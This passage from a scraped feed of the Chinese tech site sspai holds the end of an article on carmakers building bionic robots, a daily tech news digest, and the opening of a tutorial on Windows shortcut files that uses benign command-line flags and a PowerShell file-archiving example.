src=\"https://cdn.sspai.com/2021/09/11/article/1f3f27b8f81787dd54f9da7c72517fb0\"></figure><p>传统燃油车巨头中的福特、丰田、本田，深度介入移动智能出行的科技巨头华为、百度等都推出过自己的仿生机器人。</p>\n<p>齐刷刷地瞄准仿生机器人领域，<strong>智能汽车制造商们藏着怎样的心思，又握着怎样的底牌呢？</strong></p>\n<h2><strong>躲不开的老大哥</strong></h2>\n<p>当我们谈及仿生机器人，波士顿动力（Boston Dynamics）是绕不开的存在。这家 1992 年从麻省理工学院（MIT）的一个实验室脱胎，专注于工程与机器人设计的美国公司，是仿生机器人领域当之无愧的巨擘。波士顿动力的机器狗已经不止一次刷屏互联网了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/82d1bab0c489d1f1b8d8825b53ef70da\"></figure><p>任何一家试图踏足仿生机器人领域的公司，都不可避免地会被拿来和波士顿动力比对一番，<strong>智能汽车制造商们的产品和这位老大哥的宝贝们相比实力几何，又或者这些「机器人新势力」会有怎样另辟蹊径的打法呢？</strong></p>\n<p>首先在机械结构层面，与波士顿动力机采用的<strong>液压伺服控制</strong>不同（波士顿动力创始人 Marc Raibert 多次在演讲和发言中提到液压机构是被严重低估的机器执行器），特斯拉 Bot 和小米 CyberDog 都选择了<strong>电机控制</strong>，不出意外的话，小鹏机器马也会是电机控制。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/ef8f23b63e4ec0448ca9ef136569234c\"></figure><p>液压伺和电机是<strong>完全对立</strong>的两种控制执行器，<strong>液压伺服的结构复杂性要远超电机</strong>。一套液压伺服系统由动力系统和反馈机构组成，包含液压泵、管路、伺服阀、带有位置/压力反馈的油缸等装置，电机控制系统则只需要电机配上减速器和编码器。</p>\n<p>我们从波士顿动力 Atlas 和特斯拉 Bot 的外形对比上也能感受到两套系统的结构差异。虽然波士顿动力已经尽力在简化管路，并将一部分线束埋进了躯体，Atlas 的关节处仍会有管路暴露在外，相比之下特斯拉 Bot 就整洁的多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/4469d289b5dd4efeccb9e141d1e44914\"></figure><p>电机系统在稳定性和成本方面也要优于液压系统，但液压伺服系统拥有更高的功率密度，这意味着<strong>相同体积下，采用液压伺服控制的机器人拥有更强的运动能力，力气更大，跑得更快</strong>。</p>\n<p>更有趣的是，波士顿动力和特斯拉、小鹏、小米们在<strong>机器人对于时下大热的人工智能，或者说机器学习技术的应用也是完全对立的</strong>。</p>\n<p>人类产生一次行为的过程可以简化为眼看、大脑判断、四肢执行，或者说感知、决策、执行。</p>\n<p>波士顿动力以「<strong>运动智能</strong>」为核心，对步行、爬楼梯、规避障碍、抵抗冲击、穿越地形等具体场景下的运动智能控制能力不断优化，强调专而精的局部能力，对机器学习更多的应用体现在复杂的控制层面。</p>\n<p>而特斯拉、小鹏等机器人新势力的优势在于「<strong>认知智能</strong>」，从感知出发，贯穿规划到控制，端到端的机器学习能力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/a9d9704acfe862d6a414800f66958f8d\"></figure><p>从机械结构到智能控制都南辕北辙，我们可以断定<strong>机器人新势力们未来会选择不同于波士顿动力的商业模式</strong>。</p>\n<p>在波士顿动力的官方商城上，我们可以找到一段对 Spot 四足机器人的介绍：</p>\n<blockquote><p>Built to be a rugged and customizable platform, Spot has a proven track record of supporting remote operation and autonomous sensing across a variety of industries, and is remarkably intuitive, enabling you to focus on the job you do best.</p></blockquote>\n<p>——Spot 是一个坚固耐用、可定制的平台，在多个行业的远程操作支持方和自动感应方面有良好记录，而且非常直观，使您能够专注于自己最擅长的工作。</p>\n<p>「<strong>兼顾耐用</strong>」、「<strong>可定制</strong>」、「<strong>多个行业</strong>」，加上高集成、高性能、高强度 <strong>3D 打印部件</strong>的使用，高达 <strong>74,500 美元售价</strong>的四足仿生机器人，众多标签下，Spot 面向高风险，如军工、消防、航天等的 <strong>to B </strong>属性不要再明显了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/8e74413b3108d930ef3ba56029aee0cc\"></figure><p>对比之下，小米 9999 元人民币的 CyberDog 售价，Elon Musk 关于 Bot 「<strong>批量制造对类人机器人生产至关重要，这样才能保持低成本</strong>」的表态，小鹏机器马「小鹏友的第一个智慧交通工具」的定位，都昭示着机器人新势力们瞄向了更为广阔、雄心更大的<strong> to C </strong>市场。</p>\n<h2><strong>相同的底层能力</strong></h2>\n<p>把视角聚焦到智能电动车制造商本身，造汽车的企业去造仿生机器人，看似是跨度极大的转行，<strong>实则智能汽车的底层能力与仿生机器人是相通的</strong>。</p>\n<p>智能化和电动化的汹涌浪潮下，汽车厂商们已经积累下规模可观的涉及自动驾驶的 AI 感知-决策-控制等能力，涉及智能座舱的智能交互等能力，以及电动化相关的电机和电池等驱动系统能力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/769abfbc14666b0d62f096fb71758eb1\"></figure><p><strong>AI 感知-决策-控制</strong>、<strong>智能交互</strong>、<strong>驱动系统</strong>，以及汽车行业这个制造业皇冠上的明珠原本就具备的<strong>工程制造能力</strong>恰好是<strong>仿生机器人需要的核心技术</strong>。</p>\n<p>所以，对于那些车企而言，将智能移动出行领域积累下的技术导入到更具想象空间的仿生机器人<strong>在技术层面上是具备可行性的</strong>，甚至可以说是水到渠成。</p>\n<p>Elon Musk 在特斯拉 AI 日上就表示，「<strong>特斯拉汽车已经是半有知觉的生物，包括摄像头、FSD 芯片、深度神经网络和 Dojo，因此扩展到类人世界是有意义的。</strong>」</p>\n<p>特斯拉也几乎是将 Autopilot 和 FSD 的一切能力打包放在了 Tesla Bot 上，将成为 Bot 眼睛的 Autopilot Camera，内置于 Bot 胸腔中的 FSD Computer，以及 AI 日发布的多摄像头深度神经网络、神经网络训练系统、自动标注、仿真工具和超算 Dojo，全部会作为底层能力赋能于机器人业务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/dcf5ce69b50d61f1e5eaa5c543f36ff8\"></figure><p>在小鹏智能马身上，<strong>我们也能发现相同的内在逻辑</strong>。众所周知，国内造车新势力中小鹏汽车的智能化标签最鲜明，布局全栈自动驾驶自研能力的展开较早，同时小鹏 P7 的语音助手在车内交互中展现出的水平也是得到业内认可的。</p>\n<p>对于小鹏的智能机器马，官方介绍是这样形容其能力的，「具备环境多维感知、敏捷稳定运动以及智能情感交互能力」。抛开敏捷稳定能力，<strong>环境多维感知对应的是自动驾驶中最为重要的环境感知能力，智能感情交互对应的是智能座舱的语音能力。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/a92a42419996be0617e0ef0e274f4958\"></figure><p>小米虽然仍未在造车领域有实质性行动，但在人机交互、软件系统上，智能手机与智能座舱在底层技术上具有相通性。根据 36氪 的报道，某小米高管表示，「<strong>现在做车机系统的人，基本都是以前做手机开发的</strong>。」</p>\n<p>此外，手机的图像处理和自动驾驶的环境感知，以及定位上的差分 GPS、IMU 等技术也存在一定的共通性。</p>\n<p>手机和智能汽车相通的底层技术，自然也能辐射到仿生机器人领域。事实上，小米副总裁常程在微博上表示，<strong>CyberDog 最初只是小米工程师利用业余时间合作开发的小项目</strong>，偶然被雷军赏识后才成立项目组，投入资金和资源，正式进入研发阶段。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/5d5ba20c874b2ee6c9b7ea556ad23a62\"></figure><p>可能这些智能电动车制造商们在日后唯一需要额外补足的能力是控制能力，因为机器人相对灵活的肢体活动决定了其重在姿态控制的特性，对比汽车的控制要简单得多，在自动驾驶汽车的三项主要能力中，控制环节的实现难度是显著低于感知和决策的。</p>\n<h2><strong>都有光明的未来？</strong></h2>\n<p>除了底层技术的相通性，<strong>特斯拉推出 Tesla Bot 的时机也颇值得玩味</strong>。</p>\n<p>2020 年特斯拉全球交付 499550 辆，虽然受缺芯影响，2021 年 100 万辆的内部交付目标会打一定的折扣，但缺芯风波终会过去，柏林和德州工厂也即将投产，特斯拉的增长势头会保持下去。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/3c9a574b88cba047afb97d4e2f432d81\"></figure><p>在电动车业务的推动下，特斯拉依然会是世界上市值最高的公司。不过和其他企业一样，特斯拉也面临着寻找「<strong>第二增长曲线</strong>」的问题。</p>\n<p>我们知道行业发展会经历起始、成长、顶峰和衰败四个时期，企业为了长远发展，为了避免衰败期，在主业达到成熟期前，就要进行二次创新，<strong>企业的重心转移到「第二增长曲线」上，新业务的优先级会很快追上并超过主营业务。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/ce6421ce1e7a8233938c95b793ac50c7\"></figure><p>特斯拉正处在这一节点，其主营业务电动车在度过了以 Model 3 产能地狱为代表的起始期后，正处在巅峰期前的成长期中，一个新业务正是特斯拉企业战略上的重点。</p>\n<p>从 Elon Musk 在 AI 日上的态度（Tesla Bot 是全场唯一由 Elon Musk 主持的部分）来看，<strong>特斯拉似乎把「第二增长曲线」的重任压在了 Tesla Bot 身上</strong>。</p>\n<p>Tesla Bot 就像是 2004 年的特斯拉 Roadster，这是一次绝佳的第二曲线孵化尝试。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/3a1f5cf2eafaaf4439c9e74a0b1fcb22\"></figure><p>那么，小鹏和小米呢？小鹏虽然跻身国内造车新势力第一梯队，但其电动车业务仍在起始阶段，还需要港股双重上市来募集发展弹药。</p>\n<p>至于小米，虽然仍在冲击世界第二的宝座，但其实手机业务已然见顶，毕竟全球手机行业大背景摆在那里，仿生机器人显得过于前瞻，况且小米已经开始造车。</p>\n<p>他们这个时候推出仿生机器人的动机是什么呢？<strong>其实答案很简单，仿生机器人是充满前景的产业。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/1e3350df81edaf2b018d4cd1f25583bf\"></figure><p>未来是人工智能的时代，我国的《新一代人工智能发展规划》预测<strong>到 2030年，中国人工智能核心产业规模超过 1 万亿元，带动相关产业规模超过 10 万亿元</strong>。</p>\n<p>在可预见的未来，医疗和出行是人工智能的重要商业落地场景，但当我们站得再高一些，眺望得更远一些，更远的未来，仿生机器人一定会在远服务、工程、安防、医疗等领域贡献更多的价值。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/8bb56920a1abd8b6eea73c7c77625b67\"></figure><p>软银集团董事长孙正义有一个著名的 Singularity（奇点）理论，他认为随着计算机技术和生命科学的发展，人工智能和人脑的临界点正成为现时代的奇点，<strong>当人工智能的能力跨越这一奇点之后，会在 2040 年达到人脑能力的 100 万倍</strong>。</p>\n<p>所以孙正义表示，「接下来的 30 年，毫无疑问，我们（软银）的关注点就是<strong>人工智能</strong>，<strong>智能机器人</strong>和<strong>物联网</strong>」。</p>\n<p>资本、科技公司和智能电动车制造商们都在加速仿生机器人领域的布局，没有谁愿意错过这个时代风口。</p>\n<p>特斯拉、小鹏、小米们自然也是如此，何况 Ta 们已经积累下了相应的底层技术能力，而适时地小秀下肌肉还会向资本市场展现更多的想象空间，何乐而不为呢？</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/68408\" target=\"_blank\">AI Day 汇总：特斯拉是一家 AI 机器人公司吗？</a></li>\n<li><a href=\"https://sspai.com/post/68091\" target=\"_blank\">2025 年的纯电动车会是什么模样？</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/68698"},{"title":"派早报：特斯拉上调部分车型价格、Epic 起诉 Apple 首轮诉讼结果出炉等","date":"2021-09-13 00:49:51","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>特斯拉上调部分车型价格</h3>\n<p>9 月 11 日，特斯拉官方在微博发布公告，即日起，特斯拉 Model Y Performance 高性能版车型价格上调 10,000 元人民币（已定车用户价格保持不变），调整后车辆起售价为 387,900 元人民币。<a href=\"https://weibo.com/3615027564/KxDuEpzZF?type=comment#_rnd1631486925446\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/13/article/b4030336d9f73d7c77c52f5c33065e71\"></figure><h3>Epic 起诉 Apple 首轮诉讼结果出炉</h3>\n<p>Epic Game 与 Apple 的相关诉讼结果于 9 月 11 日出炉，Epic 仅在「App 内无法使用第三方付费机制违反加州的公平竞法」这一项控诉上获得法官支持，取得胜诉，其它方面均为 Apple 胜诉。Apple 也被要求不得「在 App 内购之外，阻止开发者在 App 中加入按键、链接或其它引导消费者至第三方购买渠道的机制」，并且也不得「阻止开发者与顾客透过 App 内取得的联络方式，在 App 外进行沟通」。这项禁令将在 90 天后正式生效，双方尚未表态是否会继续提起诉讼。<a href=\"https://cn.engadget.com/apple-epic-games-lawsuit-ruling-app-store-060052403.html\" target=\"_blank\">来源</a></p>\n<h3>三星发布 Galaxy Book Pro 笔记本电脑</h3>\n<p>9 月 9 日，三星更新官网信息，正式发布 Galaxy Book Pro 工作笔记本电脑。该设备具有 13.3 英寸以及 15.6 英寸两个版本，搭载英特尔 Evo™-certified 11 代处理器。系统方面，目前搭载的是最新版 Windows 10 Pro 版本，并支持后继升级至 Windows 11 Pro 版本。<a href=\"https://news.samsung.com/us/reclaim-workday-with-samsung-galaxy-book-pro/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4v9hkdb34tdhopdlvm0.jpeg\"></figure><h3>微信等 App 被责令限期解除屏蔽网址链接</h3>\n<p>工信部相关部门于 9 月 9 日 召开「屏蔽网址链接问题行政指导会」，会上工信部提出相关即时通信软件的合规标准，要求限期内各平台必须按标准解除屏蔽，否则将依法采取处置措施，参与会议的企业包括阿里巴巴、腾讯、字节跳动、百度、华为、小米、陌陌、360、网易等。<a href=\"https://www.jiemian.com/article/6586654.html\" target=\"_blank\">来源</a></p>\n<h3>亚马逊推出全新 Fire TV 系列产品，包括首款自主品牌电视</h3>\n<p>亚马逊于 9 月 9 日宣布推出全新的 Fire TV 系列产品，包括全新的自主品牌电视产品 Fire TV Omni、Fire TV 4 以及电视棒 Fire TV Stick 4K Max。</p>\n<p>其中，Fire TV Omni 智能电视产品有 43 英寸、50 英寸、55 英寸、65 英寸、75 英寸等多个型号，具有 4K 超高清分辨率，支持 HDR10、HLG 和 Dolby Digital Plus，其中 65 英寸机型、75 英寸机型具有纤薄边框，增加了对杜比视界的支持，用户可以直接通过免提方式和 Alexa 进行语音对话，包括查看天气，控制播放等等。该系列起售价为 409.99 美元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4v9hklb34tdhtodsn2g.png\"></figure><p>Fire TV 4 则是低价版的电视产品，有 43 英寸、50 英寸、55英寸可选，同样具有 4K UHD 超高清分辨率，支持 HDR10、HLG，支持通过遥控器访问 Alexa 服务，售价 369.99 美元。</p>\n<p>Fire TV Stick 4K Max 则是目前性能最为强大的 Fire TV 电视棒产品，采用了最新的四核 1.8GHz 处理器和 2GB 的运存，支持 Wi-Fi 6 网络；视听方面，支持 4K UHD、HDR、HDR10+、杜比全景声以及杜比视界，配备最新的 Alexa 语音遥控器，售价为 54.99 美元。<a href=\"https://press.aboutamazon.com/news-releases/news-release-details/introducing-all-new-fire-tv-family-including-first-ever-amazon/\" target=\"_blank\">来源</a></p>\n<h3>魅蓝科技宣布回归</h3>\n<p>9 月 10 日，魅蓝科技官方发布微博，宣布历经 1269 天后，正式回归。<a href=\"https://weibo.com/5406572240/KxxcPxujI?from=page_1006065406572240_profile&amp;wvr=6&amp;mod=weibotime&amp;type=comment#_rnd1631486814021\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4v9hktb34tdhtodsn30.jpeg\"></figure><h2>看看就行的小道消息</h2>\n<ul><li>据外媒消息报道，华为计划于 10 月 21 日在维也纳举办新产品发布会，目前暂未透露发布产品内容。<a href=\"https://www.gsmarena.com/huawei_p50_p50_pro_nova_9_global_launch_date-news-50889.php\" target=\"_blank\">来源</a>\n</li></ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📒 集合Markdwon、看板、标签等功能于一身的《<a href=\"https://sspai.com/item/276\" target=\"_blank\">大师笔记</a>》，教师节特惠即将结束。</li>\n<li>📓 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol07-pre-talk-about-notes\" target=\"_blank\">笔记大战</a>》已经上线，来看看专业作者们的笔记工具方法论吧！</li>\n<li>🎁 会员周边已经陆续完成打包发货，请会员用户留意短信通知。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1630048406\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68718\" target=\"_blank\">心之所想、一键直达：你可能不知道的 Windows 快捷方式玩法</a></li>\n<li><a href=\"https://sspai.com/post/68663\" target=\"_blank\">MeeGo 往事·第 0 章：开拓者，敢言不跟随</a></li>\n<li><a href=\"https://sspai.com/post/68317\" target=\"_blank\">入门模拟竞速，你可以从这里开始</a></li>\n<li><a href=\"https://sspai.com/post/68413\" target=\"_blank\">用不上也可以记下的好建议，让你的独居生活更有安全感</a></li>\n<li><a href=\"https://sspai.com/post/68681\" target=\"_blank\">瞎玩菌的游戏周报：游戏升级次世代版本该花钱吗？</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68723"},{"title":"心之所想、一键直达：你可能不知道的 Windows 快捷方式玩法","date":"2021-09-12 07:20:30","description":"\n<p>关于 Windows 上的一类文件有这么一些笑话：你请某人发送一个文件副本，Ta 将桌面上的「文件」拖到了聊天框，叮当一响，你收到了一份 <code>document.lnk</code>；你告诉 Ta 将某某软件卸载，于是 Ta 把桌面上的「软件」移到了回收站，告诉你「搞定了」……</p>\n<p>这类文件读者都很熟悉，我们一般称之为快捷方式，它们的图标上都带着小箭头。大部分软件安装后往往会同时在桌面和开始菜单中创建快捷方式；如果没有，一些读者可能会在目标文件上 <code>右键🖱 &gt; 发送到 &gt; 桌面快捷方式</code> 自己己新建一个。</p>\n<p>但除了右键发送到桌面，Windows 快捷方式其实还可以更快捷：在引用对象支持的情况下，它能做到直接调用软件的子功能、以某个模式启动程序等等。</p>\n<p>让我们先从快捷方式的工作方式讲起。</p>\n<h2>快捷方式的基本知识</h2>\n<p>在微软的 <a href=\"https://docs.microsoft.com/en-us/windows/win32/shell/links\" target=\"_blank\">开发者文档</a> 中，快捷方式有另外一个更准确的表述：Shell Links，可翻译为壳层链接。这个名称更趋近于它的本质：用于 Windows 壳层（Shell）的链接文件。Windows 图形壳层自然是资源管理器（explorer.exe），这是它赖以工作的进程；而「链接」则说明 Shell Links 是指向引用对象（corresponding object）的文件而并非对象本身。</p>\n<h3>工作方式和属性</h3>\n<p>以桌面上的 <code>Firefox.lnk</code> 为例，当我们双击此链接，资源管理器发现用户尝试打开的文件类型为快捷方式，便读取了它的「目标」属性的内容 <code>C:\\Program Files\\Mozilla Firefox\\firefox.exe</code>，然后尝试打开此「目标」，Firefox 程序于是被唤起了。</p>\n<p>这和我们在资源管理器地址栏输入 Firefox.exe 位置的原理和效果是类似的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqc9lb34td201m6610.png\"></figure><p>但不同的是，快捷方式有几个其他的属性是我们不能通过填充地址栏做到的：</p>\n<ul>\n<li>起始位置（工作目录 &amp; working directory）：告诉资源管理器从哪个位置打开目标，或者说，将目标运行在哪个位置；</li>\n<li>快捷键：当焦点位于快捷方式所在目录时，资源管理器接受以快捷键打开链接；</li>\n<li>备注/图标：快捷方式作为一个文件用于展示自己的各类信息。</li>\n</ul>\n<h3>后缀名和类型</h3>\n<p>听到打开快捷方式和在资源管理器地址栏输入地址类似，一些读者可能会想到，Windows 资源管理器地址栏不光能输入文件地址，还可以输入<code>shell:downloads</code> 直接打开下载文件夹，输入<code>shell:::{26EE0668-A00A-44D7-9371-BEB064C98683}</code>打开控制面板，输入<code>https://example.com</code>打开网站……</p>\n<p>是的，快捷方式也能接受这些内容。根据引用对象种类的不同，常用<sup class=\"ss-footnote\" href=\"\" title=\"还有一种快捷方式后缀名为 .cda，用于引用 CD 中的文件。\" footnote-id=\"1\">1</sup>的快捷方式分为两种：</p>\n<ol>\n<li>\n<code>.lnk</code> 链接文件：注册表位置<code>HKCR\\lnkfile</code>，引用对象是目录或文件（包括可执行程序）；</li>\n<li>\n<code>.url</code> 网络快捷方式：注册表位置<code>HKCR\\InternetShortcut</code>，引用对象是 URI。</li>\n</ol>\n<h3>创建方式和解析过程</h3>\n<p>通过图形界面创建快捷方式目前有两种途径：从引用对象创建和使用向导创建：</p>\n<ol>\n<li>从引用对象创建：这种方式需要我们提前定位到引用对象（即快捷方式的目标），选中这个对象，要么<code>右键 &gt; 发送到 &gt; 桌面快捷方式</code>，要么按住 <code>Alt</code> 键，使用鼠标拖动文件到目标目录，然后松开鼠标。前者在 Windows 11 已经变得非常繁琐。</li>\n<li>使用快捷方式创建向导：在任意目录下右键，选择<code>新建 &gt; 快捷方式</code>，填入引用对象的地址和名称。</li>\n</ol>\n<p>以上面两种方式创建快捷方式时，引用对象必须存在。但是创建完成后，引用对象存在与否就不再影响快捷方式，两者只会在用户打开快捷方式时发生关联。</p>\n<p>当用户双击快捷方式时，系统会尝试解析该快捷方式：首先它会用快捷方式指向的路径检查引用对象是否能直接找到；如果路径的目标无对象，资源管理器接下来会使用名为 <a href=\"https://docs.microsoft.com/en-us/windows/win32/fileio/distributed-link-tracking-and-object-identifiers\" target=\"_blank\">分布式链接跟踪</a> 的技术，依靠对象原来的大小，名称，创建日期等信息进行检索，成功找到目标后 Windows 会自动更新快捷方式的目标属性；若无法找到则会提示用户删除快捷方式。</p>\n<p>链接跟踪技术的应用给快捷方式带来了硬链接一样的解析效果：引用对象删除后恢复、重命名、移动位置都不会导致快捷方式失效。由于它也像符号链接一样依靠文件路径定位，所以只要路径正确，无论引用对象是否是原来的文件，快捷方式都会将其打开。</p>\n<h3>与符号链接的区别</h3>\n<p>同样可以链接到文件的路径，同样由系统提供支持，快捷方式和 <a href=\"https://sspai.com/post/66834\" target=\"_blank\">符号链接</a> 却有本质上的区别。快捷方式仍然是一个文件，它有自己的后缀名，有对应的数据（一个地址）和大小（几 KB），还有自己的图标和属性。但符号链接没有对应的数据对象，因而也没有大小可言，它没有后缀名，不具有完整文件结构。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcadb34td2ab6qgk0.png\"></figure><p>以一个房子为例，每一个房子都有坐标。给别人一个符号链接，相当于为他开了一个直通房屋所在的传送门，他不需要知道房子实际在什么地方；而快捷方式只是一张写有地址的小纸条，他需要自己摸索才能到达房子。资源管理器可以读取纸条内容后找到房屋所在，但其他程序未必有这个能力。</p>\n<h3>本节汇总：快捷方式的更多可能</h3>\n<p>综上所述，类似 TXT 文本由 Notepad 打开，快捷方式由资源管理器处理，它将自己的各个属性值传达给资源管理器，后者负责检索并打开引用对象。引用对象可以是文件、目录或 URI。</p>\n<p>指向一个文件、目录、网页的快捷方式想必读者司空见惯。但可执行程序并不是普通文件那么简单：<code>notepad.exe</code> 会打开一个未命名的文件，<code>notepad.exe kepa.txt</code> 则会新建一个名为<code>kepa.txt</code> 的文本文件；URI 方案亦不只有 <code>HTTPS</code>，它可是 iOS 自动化的老将。</p>\n<p>为链接文件添加标识与参数，将网络快捷方式目标设置为 Windows 支持的的 URI Schemes，也许能解锁快捷方式更多的可能性。</p>\n<h2>为链接文件添加标识与参数</h2>\n<p>在图形化操作系统尚未普及之前，用户一次又一次输入 <code>命令 标识（flags）参数</code> 来完成工作。这种方式即使放在今天在很多情况下仍然比图形界面更高效。且不谈一些仍然流行的终端应用，即使是那些专门为图形界面设计的应用，不少也提供了终端调用的方式和丰富的标识，而这些都能被快捷方式利用。</p>\n<p>下面以四个实例讲解相关用法，本节的小结部分总结了查找标识参数的两个方法。</p>\n<h3>用例一：快速新建 Word 博客文章</h3>\n<p>Word 内置了博客写作工具，完成后可以从软件内直接发送至 WordPress 等平台。但打开 Word，点击新建，再选择模板比较麻烦，能不能创建一个双击直接新建 Word 博客文章的快捷方式呢？</p>\n<p>首先，我们需要确认 Word 支不支持命令调用的形式，有没有提供可用的标识。在搜索引擎中键入 <code>Microsoft Word CLI Flags</code>，前几个结果中就有微软官方给出的 Office 终端调用文档，文档称可以用 <code>-t</code> 加模板路径的方式据模板新建文档，这正是我们想要的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcalb34td201m661g.png\"></figure><p>使用这类快捷方式比较推荐的做法是首先定位到应用，将此应用的快捷方式作为底版。例如此例中，Word 在 <code>Program Files\\Microsoft Office</code> 中，找到 EXE 文件、按住 Alt 拖到桌面创建一个快捷方式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcalb34td201m6620.gif\"></figure><p>打开创建的快捷方式，编辑其「目标」属性，在后面添加 <code>-t\"模板文件路径\" -q</code>，这告诉 Word 跳过启动动画并按模板文件直接新建一个文档。将图标和快捷键名称改成自己喜欢的样子，一个简单便捷的快捷方式就做好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcb5b34td2ab6qgkg.gif\"></figure><h3>用例二：以无痕模式打开 Chrome</h3>\n<p>想要有一个直接以无痕模式运行的 Chrome，方便销毁敏感的搜索记录。和上一个例子一样，首先以 <code>Chrome CLI Flags</code> 为关键词搜索，发现 Chrome 提供的参数多得几页都装不下。不过我们只需要找和无痕模式相关的标识，在网页内以 <code>incognito</code> 为关键词搜索，立即能发现<code>--incognito</code> 标识。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcb5b34td201m662g.png\"></figure><p>为 Chrome 创建快捷方式做为底版，然后在目标属性后添加 <code>--incognito</code> 即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcbdb34td2ab6qgl0.gif\"></figure><p>实际上，Chrome 为安装的浏览器应用创建的快捷方式，和它为不同的用户创建的快捷方式也都是通过添加标识和参数实现的。</p>\n<h3>用例三：一键归档桌面的已用图片</h3>\n<p>文章写到现在，笔者的桌面已经堆了不少配图。由于个人习惯边写边配图，需要用的图片已经自动上传图床，桌面上的图片大概率不会再用到了。我期望将它们快速移动到一个文件夹中，让桌面上新放的图更好找到。</p>\n<p>截图和制图工具自动生成的图片命名全都以年份（2021）开头，所以这个操作用 PowerShell 实现起来并不难：</p>\n<pre class=\"language-powershell\"><code>ni archive -Type Directory -Force; mv 2021* -Destination .\\archive\\</code></pre>\n<p>想要用快捷方式调用 PowerShell，可以找找 <code>pwsh.exe</code>（ PowerShell 7 的 exe 名称）有没有给什么提示：在终端输入 <code>pwsh.exe -h</code>，发现可以用 <code>-c</code> 参数调用命令：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4uqcblb34td2engl4jg.png\"></figure><p>接下来，我们用向导的方式创建这样一个快捷方式。在桌面 <code>右键 &gt; 新建 &gt; 快捷方式</code>，输入<code>pwsh.exe -nol -c ni archive -Type Directory -Force; mv 2021* -Destination .\\archive\\</code>，<code>-nol</code> 是不加载 Logo，会让命令处理更快一点。</p>\n<p>输入完名称后，右键刚才创建的快捷方式，修改以下信息：</p>\n<ul>\n<li>起始位置：由于命令中我们使用的是相对位置，所以要把起始位置设置为桌面的路径；</li>\n<li>运行方式 &gt; 最小化：这样不会有 PowerShell 窗口弹出，可从任务栏判断命令执行情况；</li>\n<li>（可选）快捷键：方便操作；</li>\n<li>（可选）常规 &gt; 属性 &gt; 隐藏：配合快捷键设置使用，这样一来桌面甚至连这个快捷方式都看不到，更简约。</li>\n</ul>\n<p>然后，将焦点移到桌面，按下预先设置好的快捷键或者点按此快捷方式图标，所有图片立刻归档完成。</p>\n<figure class=\"image ss-img-wrapper\"><img 